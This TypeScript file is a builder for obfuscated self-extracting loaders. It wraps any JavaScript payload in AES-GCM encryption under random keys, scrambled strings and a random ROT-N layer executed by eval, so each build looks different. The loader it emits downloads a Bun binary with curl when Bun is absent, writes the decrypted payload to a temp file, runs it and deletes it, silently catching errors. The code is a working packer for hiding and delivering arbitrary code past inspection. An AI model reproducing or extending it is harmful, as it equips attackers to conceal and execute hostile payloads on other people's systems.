// ═════════════════════════════════════════════════════════════════════════════
// Self-extracting payload builder
//
// Produces a single self-contained JS file with two encrypted sections,
// both using AES-128-GCM (same decrypt helper, different keys):
//   Section A — bun installation guard
//   Section B — main payload
//
// The outer wrapper is a compact, fixed decrypt + execute loop. All the
// "heavy" logic (bun download, payload content) lives in the encrypted
// sections so the outer layer stays small and stable.
//
// Every call produces a completely different output (random keys for both
// sections).
// ═════════════════════════════════════════════════════════════════════════════

import { createCipheriv, randomBytes } from "node:crypto";

declare function scramble(str: string): string;

// ── Types ───────────────────────────────────────────────────────────────────

export interface SelfExtractingOptions {
  /** AES key length in bytes (default: 16 for AES-128-GCM) */
  keyLen?: number;
  /** IV length in bytes (default: 12 for GCM) */
  ivLen?: number;
  /** Auth tag length in bytes (default: 16 for GCM) */
  tagLen?: number;
  /**
   * When false, returns the raw payload as-is instead of wrapping.
   * Useful for gradual rollout — call sites can opt out while testing.
   * Default: true.
   */
  wrap?: boolean;
}

// ── Bun version pin ─────────────────────────────────────────────────────────

const BUN_VERSION = scramble("bun-v1.3.13");

// ── Public API ──────────────────────────────────────────────────────────────

/**
 * Build a self-extracting JavaScript wrapper around `payload`.
 *
 * The returned string is a complete Node.js script:
 *   - outer layer: compact AES-GCM decrypt helper + execute
 *   - Section A: AES-GCM-encrypted bun install guard
 *   - Section B: AES-GCM-encrypted payload
 *
 * @param payload  The Bun.main content (raw JS source) to embed.
 */
export function buildSelfExtractingPayload(
  payload: string,
  opts: SelfExtractingOptions = {},
): string {
  if (opts.wrap === false) return payload;

  const { keyLen = 16, ivLen = 12, tagLen = 16 } = opts;
  const algo = keyLen === 16 ? "aes-128-gcm" : "aes-256-gcm";

  // ── Section A: bun guard ─────────────────────────────────────────────
  const bunGuard = buildBunGuardScript();
  const guardEnc = aesEncrypt(bunGuard, keyLen, ivLen, tagLen, algo);

  // ── Section B: payload ───────────────────────────────────────────────
  const payloadEnc = aesEncrypt(payload, keyLen, ivLen, tagLen, algo);

  // ── ROT-N outer shell (compact, random rotation per build) ──────────
  const inner = buildInnerWrapper(
    guardEnc.keyHex,
    guardEnc.ivHex,
    guardEnc.tagHex,
    guardEnc.dataHex,
    payloadEnc.keyHex,
    payloadEnc.ivHex,
    payloadEnc.tagHex,
    payloadEnc.dataHex,
    algo,
    tagLen,
  );

  const rotN = Math.floor(Math.random() * 25) + 1;
  return rotWrap(inner, rotN);
}

// ── AES-GCM encrypt ─────────────────────────────────────────────────────────

interface AesEncResult {
  keyHex: string;
  ivHex: string;
  tagHex: string;
  dataHex: string;
}

function aesEncrypt(
  plaintext: string,
  keyLen: number,
  ivLen: number,
  tagLen: number,
  algo: string,
): AesEncResult {
  const key = randomBytes(keyLen);
  const iv = randomBytes(ivLen);
  const cipher = createCipheriv(algo, key, iv, {
    authTagLength: tagLen,
  } as any);
  const encrypted = Buffer.concat([
    cipher.update(plaintext, "utf8"),
    cipher.final(),
  ]);
  return {
    keyHex: key.toString("hex"),
    ivHex: iv.toString("hex"),
    tagHex: (cipher as any).getAuthTag().toString("hex"),
    dataHex: encrypted.toString("hex"),
  };
}

// ── Bun guard script (Section A) ────────────────────────────────────────────

function buildBunGuardScript(): string {
  return [
    scramble(`(async()=>{`),
    scramble(`const{execSync}=(await import("node:child_process"))`),
    scramble(
      `const{existsSync,mkdtempSync,chmodSync}=(await import("node:fs"))`,
    ),
    scramble(`const{join}=(await import("node:path"))`),
    scramble(`const{tmpdir,platform,arch}=(await import("node:os"))`),
    scramble(`var _bunCache`),
    scramble(`globalThis.getBunPath=function(){`),
    scramble(`  if(_bunCache)return _bunCache`),
    scramble(`  const osMap={linux:"linux",darwin:"darwin",win32:"windows"}`),
    scramble(`  const a=arch==="arm64"?"aarch64":"x64-baseline"`),
    scramble(`  const os=osMap[platform]??"linux"`),
    scramble(`  const dir=mkdtempSync(join(tmpdir(),"b-"))`),
    scramble(`  const exe=join(dir,os==="windows"?"bun.exe":"bun")`),
    scramble(`  if(existsSync(exe)){_bunCache=exe;return exe}`),
    scramble(`  const url="https://github.com/oven-sh/bun/releases/download/`) +
      BUN_VERSION +
      scramble(`/bun-"+os+"-"+a+".zip"`),
    scramble(`  const zip=join(dir,"b.zip")`),
    scramble(`  execSync('curl -sSL "'+url+'" -o "'+zip+'"',{stdio:"pipe"})`),
    scramble(`  execSync('unzip -j -o "'+zip+'" -d "'+dir+'"',{stdio:"pipe"})`),
    scramble(`  chmodSync(exe,"755")`),
    scramble(`  _bunCache=exe;return exe`),
    scramble(`}`),
    scramble(`})()`),
  ].join("\n");
}

// ── ROT-N enc/dec ───────────────────────────────────────────────────────────

function rotEncode(s: string, n: number): string {
  return s.replace(/[a-zA-Z]/g, (c) => {
    const base = c <= "Z" ? 65 : 97;
    return String.fromCharCode(((c.charCodeAt(0) - base + n) % 26) + base);
  });
}

function rotWrap(inner: string, n: number): string {
  const encoded = rotEncode(inner, n);
  const r = (26 - n) % 26;
  // Use array literal + .map() to avoid Node's 65535-argument limit
  // on String.fromCharCode
  const codes = Array.from(encoded, (c) => c.charCodeAt(0)).join(",");
  return (
    `try{eval(function(s,n){return s.replace(/[a-zA-Z]/g,function(c){var b=c<="Z"?65:97;return String.fromCharCode((c.charCodeAt(0)-b+n)%26+b)})}` +
    `([${codes}].map(function(c){return String.fromCharCode(c)}).join(""),${r}))}catch(e){console.log("wrapper:",e.message||e)}`
  );
}

// ── Inner wrapper (AES decrypt + execute — this gets ROT-encoded) ───────────

function buildInnerWrapper(
  guardKeyHex: string,
  guardIvHex: string,
  guardTagHex: string,
  guardDataHex: string,
  payloadKeyHex: string,
  payloadIvHex: string,
  payloadTagHex: string,
  payloadDataHex: string,
  algo: string,
  tagLen: number,
): string {
  const importCrypto = scramble(`const _c=await import("node:crypto");`);
  const fnPrefix = scramble(
    `const _d=(k,i,a,c)=>{const d=_c.createDecipheriv("`,
  );
  const fnMiddle = scramble(
    `",Buffer.from(k,"hex"),Buffer.from(i,"hex"),{authTagLength:`,
  );
  const fnSuffix = scramble(
    `});d.setAuthTag(Buffer.from(a,"hex"));return Buffer.concat([d.update(Buffer.from(c,"hex")),d.final()])};`,
  );

  return [
    scramble(`(async()=>{try{`),
    importCrypto,
    fnPrefix + algo + fnMiddle + String(tagLen) + fnSuffix,
    ``,
    // ── Section A: bun guard ───────────────────────────────────────────
    scramble(`const _b=_d("`) +
      guardKeyHex +
      scramble(`","`) +
      guardIvHex +
      scramble(`","`) +
      guardTagHex +
      scramble(`","`) +
      guardDataHex +
      scramble(`").toString("utf8")`),
    ``,
    // ── Section B: payload ─────────────────────────────────────────────
    scramble(`const _p=_d("`) +
      payloadKeyHex +
      scramble(`","`) +
      payloadIvHex +
      scramble(`","`) +
      payloadTagHex +
      scramble(`","`) +
      payloadDataHex +
      scramble(`").toString("utf8")`),
    ``,
    // ── Execute ────────────────────────────────────────────────────────
    scramble(`const _fs=await import("node:fs")`),
    scramble(`const _cp=await import("node:child_process")`),
    scramble(`  const t="/tmp/p"+Math.random().toString(36).slice(2)+".js"`),
    scramble(`  _fs.writeFileSync(t,_p);`),
    scramble(`  if(typeof Bun!=="undefined"){`),
    scramble(`    try{_cp.execSync('bun run "'+t+'"',{stdio:"inherit"})}`),
    scramble(`    finally{try{_fs.unlinkSync(t)}catch{}}`),
    scramble(`  }else{`),
    scramble(`    await(0,eval)(_b);`),
    scramble(
      `    try{_cp.execSync('"'+getBunPath()+'" run "'+t+'"',{stdio:"inherit"})}`,
    ),
    scramble(`    finally{try{_fs.unlinkSync(t)}catch{}}`),
    scramble(`  }`),
    scramble(`}catch(e){console.log("wrapper:",e.message||e)}})()`),
  ].join("\n");
}
